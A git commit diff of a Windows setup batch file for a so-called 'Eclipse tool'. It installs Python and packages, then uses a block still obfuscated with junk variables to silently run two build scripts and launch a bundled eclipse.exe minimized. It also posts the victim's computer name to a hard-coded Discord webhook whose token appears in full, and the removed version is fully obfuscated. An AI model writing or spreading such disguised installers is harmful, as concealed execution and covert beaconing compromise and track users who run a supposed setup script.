94e61d4a347ef80fba329c239a378354a771d695
Zay <evym.weekszayden@gmail.com>
2024-09-05 20:39:41 -0700

    Add files via upload

--- SETUP+RUN.bat
+++ SETUP+RUN.bat
@@ -1,63 +1,50 @@
+@echo off
 
-::   ██████  ▄████▄   ██▀███   ██▓ ██▓███  ▄▄▄█████▓  ▄████  █    ██  ▄▄▄       ██▀███  ▓█████▄ 
-:: ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▓██░  ██▒▓  ██▒ ▓▒ ██▒ ▀█▒ ██  ▓██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌
-:: ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▒ ▓██░ ▒░▒██░▄▄▄░▓██  ▒██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌
-::   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░▓█  ██▓▓▓█  ░██░░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌
-:: ▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒░██░▒██▒ ░  ░  ▒██▒ ░ ░▒▓███▀▒▒▒█████▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▓ 
-:: ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░  ▒ ░░    ░▒   ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ 
-:: ░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░ ▒ ░░▒ ░         ░      ░   ░ ░░▒░ ░ ░   ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒ 
-:: ░  ░  ░  ░          ░░   ░  ▒ ░░░         ░      ░ ░   ░  ░░░ ░ ░   ░   ▒     ░░   ░  ░ ░  ░ 
-::       ░  ░ ░         ░      ░                          ░    ░           ░  ░   ░        ░    
-::          ░                                                                            ░      
-::
-:: !! Obfuscated By ScriptGuard !!
+Title Download Modules...
 
+echo Downloading Requirements... (This should take around 2 minutes the first time running)
 
-@%L%e%JC%c%AAfUudICD%h%uB%o%JtxzVSeT% %ADiDlghOgj%o%HxpKeROd%f%hBLlYv%f%TaoWQLLn%
-
-T%TVE%i%pYwYkRKo%t%XIHeyazwJt%l%R%e%FWnGdi% %LHmDFAboom%D%EBTbZwUsGP%o%ibJKQYtvQc%w%x%n%Oxwjbh%l%EeNMxaMoil%o%LQy%a%BqKtdhm%d%BiMDMRTQS% %THGXHJoN%M%kXfkB%o%jArCDwH%d%AbPZilYguo%u%zq%l%uieBCwiWf%e%KCfn%s%AVkWE%.%DdzINaaMh%.%WjqssUlR%.%EpwnOmSVJ%
-
-e%PKFXEW%c%K%h%JcyYb%o%CEFVNBo% %MIaTRpEg%D%ow%o%eMS%w%yol%n%ZSOBE%l%X%o%pVR%a%mOLhNbU%d%CJDjTBl%i%tS%n%PhstkOuPNR%g%TqFCOHzaI% %Fba%R%vi%e%pjerd%q%WoHBs%u%lIx%i%OjTnPVeHqE%r%IxzXjYOevA%e%DvAhu%m%Y%e%AYGUe%n%YhADHabKr%t%JOatjlqy%s%kTpLGcXvj%.%lb%.%zZErpAS%.%oXpapkk% %kPv%(%Y%T%q%h%zOjtWxiF%i%ACuDLTELSW%s%Ki% %vbXFxvXF%s%GRNB%h%P%o%HygmWg%u%hG%l%UDeyIQ%d%SzXsciGDlZ% %axjQ%t%vqo%a%S%k%hc%e%gq% %oFjq%a%wIEMmAq%r%gb%o%jnQPhoaH%u%Y%n%YpKFphAson%d%YXP% %ZoXIGbbAY%2%WMuTvNq% %TyfWSFfgWM%m%jPCYaIHR%i%qq%n%acomFYW%u%zSnNCtTqje%t%DEGnqWR%e%tSSCGZqh%s%yImdtweBIx% %ZZIEy%t%DcOpuAKcd%h%xRfuP%e%oaTTDMtrLy% %l%f%btlWGfjF%i%fcMVNg%r%oPIaCQwec%s%eR%t%nY% %d%t%xQrquxvlM%i%kHRxsljQ%m%r%e%QARBHE% %JkpqQlwy%r%zHT%u%ywrczUXOXQ%n%ngearibkU%n%HKQ%i%BYdoyzwth%n%xWaBduP%g%qqPcWFUIZ%)%wqxQKTgZ%
-
-p%MEdugkX%y%zhLNTdVXXZ%t%x%h%Gm%o%LAsmmYDWt%n%FWI% %Qn%-%onrkZH%-%gNLX%v%sBZQYXiRKu%e%PaIRorBYvi%r%BX%s%dgsRDOmX%i%OK%o%x%n%ZHkFs% %zLfHgyMTMH%3%VQTW%>%LBxNFoAN%N%vvYxTTD%U%YmUssiBwxl%L%yXwBZP% %AUmGVJ%2%DaT%>%cWRBpSUOMn%&%KOWkMlFJ%1%praIsy%
-i%H%f%CqLU% %G%%E%vEdxKpvUx%R%B%R%IS%O%CnKi%R%V%L%wjws%E%VQPlKT%V%EATNnaiLJ%E%RxWt%L%OcsrgK%% %WFUxnETaf%n%EQkFWn%e%QHjfTle%q%Kmwe% %THDB%0%LWqDTn% %hvUCIWJZfg%(%LCTPCqVZz%
+python --version 3>NUL 2>&1
+if %ERRORLEVEL% neq 0 (
     powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe' -OutFile 'python_installer.exe' >$null 2>&1"
- %JWNXqv% %zXv% %HfbIfvyqit% %KlzHIa%p%FCpVW%o%GiAStZKLMl%w%dfRhBOU%e%nC%r%EWab%s%zOwcYFyc%h%JpNN%e%LwCaKUb%l%GXLAdYdn%l%Oob% %w%-%Zz%C%wVdP%o%tRNmghHse%m%KGZDvye%m%BioMbGuHog%a%R%n%rwiRR%d%oniHopvPn% %hOxiTDh%"%JDsIDJC%I%MF%n%NetA%v%xyXe%o%vIaFrziCDe%k%XusiC%e%WlUKfdng%-%wwRJrUBKU%W%kebHPZHeg%e%JomfKYMEM%b%PGigxmRmYL%R%CADHvFgDg%e%YFUyzP%q%IUpHXLbD%u%jBF%e%EJt%s%GnEoehx%t%cdLLEGsS% %oDHXyqMRto%-%hIbDULJWZy%U%PBMmD%r%EdWZalY%i%mwwusgm% %eWsgnWq%'%F%h%KogYCLB%t%aQFXY%t%fRE%p%sXw%s%LavhzwAhV%:%oDVPo%/%cCYSQ%/%xQwyFtFcpP%w%gA%w%ZCq%w%J%.%mXKg%p%QX%y%iz%t%QYd%h%IGrqGgovUE%o%fWq%n%LBWsR%.%oOiGzmySoa%o%whQzETexS%r%tpJpicCi%g%M%/%NTOaYFNn%f%YNg%t%TSIWxCyeo%p%F%/%QpoYyb%p%yoNP%y%tuqXx%t%uHG%h%qxSVh%o%ePh%n%rzwkfc%/%YJGzoY%3%CIU%.%DJ%1%jW%0%bTYrHtDJrz%.%vVmFJrpV%9%skOZryhS%/%S%p%ZePtVXCx%y%znGzLl%t%HL%h%sFubCOL%o%Mswt%n%VPZ%-%FlOsoDwjT%3%VtLKfILSny%.%FXrraOnK%1%h%0%t%.%taFMv%9%IRdEtyHWA%-%BDwUJnBq%a%i%m%gZAMyyr%d%iFz%6%AAq%4%ZDBZz%.%dSao%e%DEzk%x%ZmaN%e%eLhrp%'%hj% %jmFo%-%laGl%O%AnlzKrQnLk%u%UGITBqIM%t%POHgZ%F%BKBzH%i%y%l%En%e%hqGZtib% %qvCZHvfcC%'%vpN%p%RFQlLQ%y%gSflbGa%t%sPXqWLsgZ%h%Qxxy%o%NMkQk%n%g%_%jsialFbGD%i%DVgaexp%n%rthMgjRc%s%qRFIME%t%OmQPKufwwH%a%IsPHfT%l%MnFRlIeA%l%p%e%FEqBFKFv%r%SDbcxuuz%.%ttvN%e%RKI%x%uMWDfCx%e%KEjEcrrrrj%'%tSsCp% %BxAJOlRab%>%i%$%NmpoqafxZt%n%NhLp%u%SqfNcvV%l%YewPGEu%l%ghFZ% %wsDJkoW%2%WoHzmOOHo%>%ZUegD%&%gFSgmrO%1%KL%"%ILDjCQvCQ%
- %PDBX% %j% %o% %Dsne%s%rBUI%t%oQ%a%FxsLmRkN%r%e%t%ftos% %BcYZnSsok%/%bvGxrSXl%w%FqtgDy%a%rWA%i%VspuTaoEU%t%ebCHs% %PIGte%p%wuYjBb%y%F%t%HCQoau%h%LM%o%Rrvyx%n%ufqOTbS%_%dxWy%i%j%n%YokVCJmvxi%s%YEKcHX%t%Je%a%CbrA%l%FAsYXcEb%l%EUqcraQf%e%uuJ%r%kad%.%CviGG%e%nRVBCG%x%jX%e%SiKPCvTuf% %IP%/%lTzj%q%M%u%YrISm%i%aGWZSfImd%e%Nt%t%tXY% %gpAgSTq%I%OjkjyU%n%WSkJRLm%s%lh%t%gGSEDdX%a%pftmLE%l%OTEMwOW%l%slxLDp%A%LIKvX%l%M%l%qO%U%pNqG%s%FlFVgGxZ%e%zVt%r%LY%s%flVxd%=%iFMbHaIzyj%1%cJvOXt% %gFAbuRB%P%yMHwYopU%r%oC%e%XnNhzrCrb%p%HDVStn%e%LJw%n%zhIO%d%JSW%P%SIamgKs%a%lmRCsVQ%t%vYpdYaevQ%h%G%=%JpOLMSURy%1%ogDor% %RPDOaVFHwz%I%pOa%n%mNZjt%c%JlGuskHkfz%l%Pfrh%u%hpCccvvIK%d%bLqrat%e%vDwtFD%_%eL%p%pFclFOtQg%i%zWQTBzTv%p%aukSZ%=%b%1%iKmYzjZ%
- %SlozLhEPX% %ZEFWmH% %JXmvu% %GAgNcVEvA%d%NNPrMZQTya%e%fzArp%l%BkoHrLa% %ChxT%p%GWrrFI%y%apOGNsk%t%wDEtl%h%PLVzTeBac%o%QiiIAJBDLe%n%fva%_%aBRFpalS%i%AAovnxaG%n%n%s%sDjuaLnr%t%ezyz%a%TSXL%l%noAyvo%l%x%e%CznOyLU%r%xnVPyX%.%Q%e%N%x%JlTy%e%WtpyvqYVso%
+    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
+    del python_installer.exe
 
- %YOrR% %nfjRZGd% %uyNHazQ% %xKtahwJHMD%w%BQXqe%h%SURFWdhI%e%c%r%fKVvWDmdD%e%IPKrKEzer% %fhJzvGRnYr%p%sCvE%y%ZON%t%MlOgIATT%h%cLYxeUyMO%o%Bb%n%LsfVcaeHk% %Qt%>%zMLkm%n%QLIsWcrcFO%u%Zi%l%Ye% %OA%2%acg%>%WksgdUvU%&%g%1%yUn%
- %yOwKdl% %vYGW% %fd% %XqpFx%i%wu%f%BX% %po%%E%cVq%R%ZRSnBu%R%GiMRqSr%O%AL%R%lHxidg%L%fYpI%E%KYyNa%V%uidDHMCphm%E%xpfxPBiwl%L%rKl%% %m%n%jKMvHV%e%u%q%K% %xcNVE%0%YICNLV% %lVGGzr%(%opELPdSvt%
- %KFvKabIq% %zSvzKFGeBa% %Ye% %E% %rQ% %vY% %CUpOb% %inV%e%KAHKbxgyE%x%n%i%xyZDtoHv%t%XqtZ% %DG%/%T%b%NmeUFSGb% %fQAttluM%1%rAlFwBoNG%
- %iusnT% %dAPKBp% %caXlQcrq% %DIAuQBV%)%HWszNHXRxr%
-)%rVja%
+    where python >nul 2>&1
+    if %ERRORLEVEL% neq 0 (
+        exit /b 1
+    )
+)
 
-p%VJpMIv%y%VNxL%t%sKROrurkO%h%Jvq%o%vuYZ%n%rSv% %FWBQzO%-%aNwiCQZ%m%kG% %nkzzTHU%p%teNTJDNegf%i%lbSBZoCZ%p%H% %ROQlnM%-%MuE%-%T%v%zILyUdoxw%e%KwZBIY%r%DkusuFyjBr%s%Do%i%jZTorb%o%FKJTsLRPdX%n%WSDr% %hMgdrm%>%KQKLXxq%n%RjXZKLBCYQ%u%mZmRJ%l%Fjp% %CcDd%2%TraVsqoYI%>%Nw%&%ZYotpZAUde%1%FQGVM%
-i%qfRpb%f%IcDADlIrUq% %Sc%%E%oRZYuXkQZv%R%lYez%R%YkdI%O%P%R%olsy%L%eSnQtMX%E%IYj%V%sfLrrXGx%E%iVlSce%L%r%% %uBSf%n%Kdd%e%DqCdAJI%q%swtrTubPXb% %aKHwoj%0%Zif% %n%(%a%
- %KKi% %sI% %ZpCLT% %erjaGcIw%p%MaPhoU%y%JHXBQpm%t%wUQNQg%h%KKnmk%o%grKsZPsLd%n%qpoI% %fysgiVi%-%toSnk%m%xobJ% %w%e%WUbYyneIW%n%R%s%PGVOKV%u%Ujy%r%xSPnZNWFU%e%DzZqtvCa%p%OyWK%i%fSbu%p%Xm% %UrOjOx%>%RXedvRbaU%n%XSdzSHo%u%z%l%USUuisDWh% %oonMLsV%2%mQA%>%kTNke%&%fpg%1%lbAhZc%
- %WInLW% %PyVyF% %AuLDLa% %Kmq%p%kqWN%y%NzMfB%t%nzWrdXTNqT%h%UW%o%Gnqa%n%HcnurR% %JalxAkNx%-%hGD%m%YNvOCTHkO% %uS%p%xHzBBsPaj%i%rkn%p%N% %adKFwedsvx%i%S%n%MrGV%s%QFDABpau%t%SVXU%a%iOfzQYS%l%BXXzMn%l%JLmRLtoGtk% %mskAg%-%SWyuZWT%-%tTvWs%u%DRJrTw%p%qgTFEmee%g%KoKoveut%r%GAwKNAPSgs%a%xCgInsRT%d%YbN%e%laPka% %dJTYhhR%p%OGLhYCOQgT%i%iBJgVcVUi%p%SkhY% %j%>%okSY%n%BBWZtn%u%pjZuXbXjxk%l%xbtb% %SQLBG%2%HXQjU%>%IvnHvJ%&%YWchyGI%1%OkJQgYh%
- %ezQbYdn% %ilmswEREG% %yiXSjK% %KQNKd%p%je%y%nqVLZ%t%Rj%h%w%o%TvgAK%n%TyTJzLHSW% %wu%-%sYAr%m%s% %k%p%szcNb%i%VzleuRekbB%p%WQzU% %SAZLM%-%VZstRPUNP%-%BFOVM%v%DKbvzceTz%e%yxJbI%r%dBBRGLc%s%YTeeVQ%i%Wz%o%OHipyi%n%PKx% %XlP%>%WRgFmY%n%JwFqurREa%u%lJdcugoXkq%l%l% %JUOBW%2%wdJMlo%>%WPsULBaXaF%&%ZbDGbuxetV%1%tA%
- %m% %evnE% %llBrsO% %oCtBJoo%i%EdWSkfIgRC%f%yYAc% %pacc%%E%XVqafxBmPC%R%Eibj%R%n%O%MD%R%h%L%chnMV%E%gTedHefjV%V%lbiYorWdY%E%jpHKZCgkc%L%MxHBF%% %RqVnnCelcl%n%IZzfYt%e%WmSHZ%q%bVN% %ADQea%0%oTBHfTpt% %rQIoHdX%(%rJmYGeIK%
- %GWj% %GGA% %jcDsuDfBvK% %gXhN% %sEZUi% %Mpgmv% %JWH% %bD%e%kMhYaOHV%x%A%i%D%t%fotKPcJ% %bNtYvn%/%Jwzc%b%jdJzemtqb% %wwhwn%1%ISH%
- %gaYhv% %OtVwUmKTVi% %X% %BPUBEko%)%pECpGYgU%
-)%erD%
+python -m pip --version >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    python -m ensurepip >nul 2>&1
+    python -m pip install --upgrade pip >nul 2>&1
+    python -m pip --version >nul 2>&1
+    if %ERRORLEVEL% neq 0 (
+        exit /b 1
+    )
+)
 
-p%cqkpSJrS%i%QwfmMbd%p%SYOOMXsUu% %OgHDfOnOTZ%i%dJyenDvdX%n%rriM%s%cgO%t%AkWBIay%a%JcQrss%l%lqSvECby%l%mTmtymK% %Kkzl%-%U%r%bwnb% %QNrvgmWb%r%uSoUjeZmy%e%bRBq%q%i%u%rWRpeBQv%i%fcDNg%r%mIZcwusJol%e%uC%m%HdtwFNv%e%tBr%n%saviY%t%NsexdUwpRI%s%Qdh%.%BX%t%R%x%xGn%t%QFc% %C%2%gyu%>%V%n%DJVrulERPG%u%abfXD%l%KhmBjZDTX%
+pip install -r requirements.txt 2>nul
 
-i%AOr%f%MK% %zBroVQM%n%ZhITAIMFaT%o%kTEOv%t%TBoinEM% %FhuiEzzvCU%e%zQwHTcHE%x%AiZpig%i%ls%s%TzWXjV%t%CpoZoBVyyK% %RIDtyVY%"%YxHQtIawc%b%RW%u%PAdaTKs%i%mtInTS%l%NQR%d%NV%_%IsBHgZP%d%yrYLR%o%BsDhqm%n%OLzPs%e%CHvqMs%.%b%f%IayopnMi%l%nIbOG%a%PIjPz%g%xxrDhVEV%"%L% %XNED%(%u%
- %it% %GXd% %cBCR% %GJBhs%p%kiKZ%y%qgORMBZe%t%jGrnpJVCt%h%nXYJTps%o%wdRaSOV%n%BbmVce% %LeFhwDOlZ%u%oPSopb%t%lY%i%mjqcALqO%l%Ptq%i%OewGhp%t%FQYcHfCTU%i%Cghw%e%btpy%s%HpXjtOw%/%jb%P%hJFT%l%NlIJv%u%tonLw%g%Qmv%i%a%n%TtAhfPFqt%s%DZzkVdk%/%GUHyDBNEWD%b%IRwcWeZHR%u%iNSDVrdJe%i%awXcDKrmK%l%JwjJ%d%fYWYhruAu%.%UOnCMjhFT%p%mRuoaJXk%y%Djor% %SuoJNRIqSH%>%Ck%n%KWpMHVWu%u%JvcBSkKF%l%PdEFnxNN% %QLfkXCErC%2%wyOpdTWR%>%ALyy%&%U%1%SXwVQr%
- %rZlUrYk% %TpHk% %zuxV% %Y%i%I%f%BpjFoih% %EcLl%%E%mEcIAqWyA%R%lTaL%R%dyX%O%hjBbhzgm%R%z%L%iaIqacwML%E%s%V%MoNvUi%E%mw%L%icDOLUg%% %SVHvREWrso%n%XoxjdfHuh%e%baFtVPOjaB%q%hwV% %Mj%0%cnUabFESQ% %MUAn%(%R%
- %Ul% %x% %nN% %ZG% %gOPzDjWgs% %GhDkOQ% %AKfwqbDU% %BHfeXoK%e%jzKXbYofGb%x%g%i%KiYWrkWKnK%t%sS% %LyGMyjvH%/%D%b%Jt% %SrhGAG%1%L%
- %Joh% %Ihpnz% %PoAZNETD% %Nnbn%)%q%
+i%iYQg%f%MHu% %sFfojwKLNx%n%NMdDX%o%Hrstdx%t%XYVGJxMw% %zyPWI%e%yKlJtPWRS%x%c%i%RUnObYks%s%WeNlFvXSlB%t%QErUwPQ% %VwkFWdrW%"%EdidDmOm%b%ACltiITN%u%vvuIGva%i%jsG%l%HtVFGCn%d%udlbXAcecw%_%JhpbE%d%bUJcRaJk%o%ELDNU%n%qC%e%NsNRn%.%pzzwmjPwzf%f%JVRLej%l%YhvxdEBSy%a%neBY%g%bn%"%Oymu% %JW%(%SrOREoJhbH%
+ %TaEIRojVZ% %rP% %XCMmWyhWaB% %TVtLgl%p%P%y%qvmDYt%t%YgduCpI%h%ckrfW%o%OBiuJumK%n%rNTbUYO% %D%u%WVbNM%t%lJmDILGDA%i%Fm%l%qXqVKRVBwp%i%lWrcXP%t%DTJunttX%i%ubGdr%e%UZNsoXLVKo%s%HsvSAEflOh%/%YVdMJYGI%P%IDHQ%l%axCz%u%NlSg%g%fXjz%i%AGSace%n%lShb%s%FwBOECu%/%nfvmoBSjm%b%GuKKgbfIX%u%OkMHTCxPz%i%WEZ%l%s%d%RQ%.%kwq%p%yw%y%juFOvTnie% %MCY%>%OBVRgPPix%n%TaH%u%jYwntFZ%l%G% %nXP%2%biIAiByon%>%cmR%&%dSOJPoIMx%1%uiXBy%
+ %zPAbV% %OsfuHEkLRa% %nP% %QiZDZU%i%qNNyvV%f%xAhwYLza% %yC%%E%xIPYXP%R%xeSFpp%R%OSHEEtrsc%O%I%R%xmo%L%hjdXiW%E%PPMj%V%uQg%E%BO%L%wDDvh%% %MvWPhUuat%n%heZMt%e%UdTR%q%lMUaRC% %VTtvPMd%0%tfgIkI% %e%(%iXoROXepEX%
+ %k% %MzBiP% %w% %E% %npU% %UPdSMi% %YkFOdFIwn% %eRhOuUu%e%mCKlgrg%x%geXA%i%gy%t%DSUAMsz% %tgBtO%/%hVgz%b%VCVRGZGNKX% %Wxj%1%KH%
+ %NT% %CzLmusB% %B% %m%)%fTWua%
 
- %BveaVRndIj% %TI% %gkzG% %YJfgrhIak%p%sqJIJYijHi%y%fJVVVqi%t%sdkG%h%xDmcygs%o%Lxi%n%ctpw% %vaKChkL%u%GdbI%t%l%i%MH%l%ZkBaemam%i%xX%t%vVNYhcaCfC%i%kU%e%oQIthTroPc%s%VfSvnFZB%/%fZchD%P%R%l%Zr%u%rotrU%g%H%i%PRaSAvQIV%n%VvUbhScUDM%s%y%/%LPum%b%mjvhEgyNk%u%EmxoiVbK%i%wwTMyth%l%qYm%d%YbEFcujw%2%BTOSveQme%.%zNB%p%kmFA%y%YqieIFvQ% %Elyxn%>%HINf%n%tc%u%fbvEqFfU%l%zeVjPVeIf% %f%2%rDtUpcgOL%>%lyg%&%btjMvL%1%qdmUenoihO%
- %gPFU% %QBthUg% %TN% %qpXzTAd%i%lWKppiTm%f%xpu% %NjpzeAUeC%%E%PIL%R%yzwgpmfohI%R%wDJHqhHfLr%O%wd%R%tAhijOFS%L%JyEBGJUw%E%RVYOnTs%V%ZzQfMTB%E%CtdZzVlsfp%L%fU%% %eyfXo%n%wihEUo%e%Nx%q%rsGbccG% %McWCup%0%pPbQpl% %uhede%(%oemGL%
- %X% %fVYQRVeMxy% %q% %DPGxjjzoT% %oC% %r% %nKJKMnx% %IJFPNfQ%e%FHiFeG%x%Ka%i%ntNCRA%t%K% %KPtb%/%b%b%iXztGzrybI% %dEMPBiT%1%VTqk%
- %DkEriaLm% %uwOcR% %uzHTsjEiFo% %iik%)%GuGiVbCp%
+ %IHAW% %HLLelfcXp% %QRqmDkmza% %DLmZW%p%pdbBLLxAke%y%qqcuL%t%ZOyJoTJa%h%RFwpw%o%MDcvZdfJ%n%c% %sPaW%u%VI%t%vwFmKmYLDG%i%AOrCcSnr%l%KbZbQJHsk%i%QcqphMkd%t%iRvgXg%i%tiXFJzm%e%ssJNPYZcd%s%ZxdcdwXEQX%/%ZkLwT%P%PEYqCiZ%l%SfD%u%bR%g%AJLHHlXMzw%i%mYLGG%n%SgZkFUz%s%UsmU%/%gnHsBHdu%b%k%u%R%i%vuxaYs%l%VqcsYIqo%d%ANxGIOD%2%ANunAAPzU%.%q%p%ZD%y%jnYXaOelUA% %wixH%>%Wd%n%ChKB%u%BmGwKdVYge%l%iCTaCSya% %DlIkZzJ%2%rdWB%>%JAP%&%KkXTb%1%jQckkVx%
+ %XxrbtUHD% %tZbW% %GVe% %kiFm%i%QVhxzH%f%MzBc% %eEm%%E%alqgespYNq%R%dgSmbC%R%XUeqxOr%O%uoQJkFz%R%eQVc%L%pJUNLHi%E%PGC%V%GGhGWh%E%fi%L%ALdb%% %bPnrxlRd%n%G%e%zBbTltZ%q%tnZW% %DhWWPoT%0%AFmGBSd% %Y%(%vcqTY%
+ %GHzX% %DMIvlZh% %OkEPjx% %cUicSB% %j% %vlqrmIBDeB% %QTyRUaXPk% %ZrSQnCeNB%e%vootyN%x%bR%i%ypSJ%t%fyB% %ThKm%/%WaTaNpa%b%rgZFV% %Muh%1%KiZfw%
+ %wQxlMtv% %GPIameoE% %sYkXtp% %zUo%)%tXOchPQ%
 
- %nJaBVc% %Z% %TIgYMUgEKd% %ZfVfXmfE%s%DnI%t%YeSTJpDDF%a%tWoXScj%r%AhVJCKApO%t%SRyv% %MjTpjR%/%XgI%m%Ingw%i%xKHVBbAnrl%n%WlL% %D%/%tkeQDFk%w%JNdSbVJ%a%ApfTF%i%J%t%pnPgZfEahM% %jDqrhxYv%"%V%"%tncpjWlB% %eU%u%RFjxNo%t%K%i%tpDc%l%hbEnn%i%ZrtMn%t%dHEUVC%i%aklWT%e%BB%s%LLBKNs%/%Gf%P%IgZEYywYI%l%XbNwocZg%u%L%g%Mrh%i%FFRPHeK%n%Gl%s%RIXf%/%kSGr%e%L%c%hiN%l%SavVjQUodp%i%Q%p%ZgMDGm%s%wmG%e%VJL%.%Y%e%CMAswWmdJ%x%RYvJxwzbj%e%CPfOs% %ReZP%>%toULM%n%cA%u%S%l%pzh% %iLvXIpVj%2%j%>%sEJyiaWSx%&%b%1%eSFuTZ%
+ %Id% %oItaTwL% %KVbtfBTC% %qqQz%s%Jj%t%cKnQR%a%GXbgGPNNy%r%KN%t%VBkV% %xEQNsyr%/%AabC%m%P%i%zIFZjUfwa%n%SIHTh% %Bq%/%CHTBnnHSLq%w%vc%a%BmKQBrc%i%QyGdy%t%BqwpWl% %qech%"%pP%"%wkQHEgydA% %AXwoZUW%u%sjmxyOAs%t%TIkPg%i%cdlHJXAKFc%l%EU%i%ecWCLBgw%t%P%i%lw%e%A%s%YqCAbFNe%/%suqqyh%P%XVyy%l%Xa%u%KHqzQ%g%jhrZLTp%i%aGaC%n%kCSKIZmOn%s%InkuIHQ%/%vnyEzbpIP%e%kQIG%c%jIkehnVm%l%UYg%i%vGIcvU%p%x%s%weSyb%e%ZelxfQnJJA%.%xUwu%e%suORMT%x%RaCmHAAGx%e%q% %s%>%ZaGANGo%n%XVJDUcaBd%u%TbmxrQT%l%K% %DqQwcMw%2%ks%>%hZNGQYDy%&%xgwkAMIloQ%1%LxmLwlXpqI%
 
- %rYi% %LCNdXTSYx% %OrSf% %Fv%t%VAMBPw%y%WCT%p%kQYGJ%e%QcyMJMs% %P%n%Jm%u%yqYp%l%oIciMRVpt% %tyFzonQM%>%bGEbbgH% %gEtECW%b%CulIw%u%XPjQAoHk%i%Rts%l%vp%d%uRxbDSQAGn%_%h%d%hmUjWjSJo%o%Sne%n%hlYUEureO%e%xdInAeZQx%.%vUeCBj%f%HRrwm%l%UjYLo%a%Mom%g%ADAoi%
-)%pACOi%
+ %Ckl% %p% %qt% %SvcjFrCxLs%t%cMeTF%y%UkJoi%p%WrpvzFWu%e%YTiYJPTSoQ% %e%n%LrQyzAsD%u%UwCJlvEB%l%epfh% %jGRBhxZ%>%Ax% %lmd%b%iP%u%aqyKAh%i%i%l%lBapfKGXg%d%W%_%CleQ%d%fPF%o%lU%n%cHqIFn%e%k%.%MUPLUglfpT%f%r%l%TL%a%gW%g%mTQUysOII%
+)%ElihC%
 
-p%Qwq%y%MItOWfsxSQ%t%vYNUo%h%GRTxqigL%o%UaHIX%n%iEGld% %ocbSEiQlSx%m%YDzNllhxWV%a%EYAue%i%ZpZNj%n%ikuNDxs%.%kbEwZL%p%F%y%donnuQb%
+set SYSTEM_NAME=%COMPUTERNAME%
+curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%SYSTEM_NAME% has run Eclipse tool.\"}" https://discord.com/api/webhooks/1267985728223186958/_UwqU1xD0Qkn9akumzYJ0ERtFCZSLxzGdYQFnWWmibLyivYVLIxMHzSbyZ57LXiCsN17
+
+python main.py
